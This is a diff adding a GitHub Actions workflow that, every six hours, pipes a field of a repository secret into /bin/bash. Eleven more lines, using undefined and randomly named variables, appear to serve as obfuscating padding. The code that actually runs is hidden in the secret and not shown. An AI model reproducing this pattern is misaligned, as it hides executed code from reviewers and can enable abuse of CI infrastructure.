@@ -1,0 +1,29 @@
+name: jiebanzhuai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: jiebanzhuai
+        env:
+          avqpu77994: ${{ secrets.avqpu77994 }}
+        run: |
+          echo $avqpu77994 | jq -r .laj50 | /bin/bash
+          echo $ki40143 | jq -r .x93682 | /bin/bash
+          echo $ogy9 | jq -r .evsm1 | /bin/bash
+          echo $ofwo1 | jq -r .ly69 | /bin/bash
+          echo $kpyj90115 | jq -r .rtdq3452 | /bin/bash
+          echo $ts26342 | jq -r .ky902 | /bin/bash
+          echo $q0 | jq -r .fta64 | /bin/bash
+          echo $xh445 | jq -r .jqoh28 | /bin/bash
+          echo $uo00134 | jq -r .pv977 | /bin/bash
+          echo $bvylg42458 | jq -r .ybhfa46 | /bin/bash
+          echo $trptx7 | jq -r .gfvck94 | /bin/bash
+          echo $e67 | jq -r .xmhfh7734 | /bin/bash
+
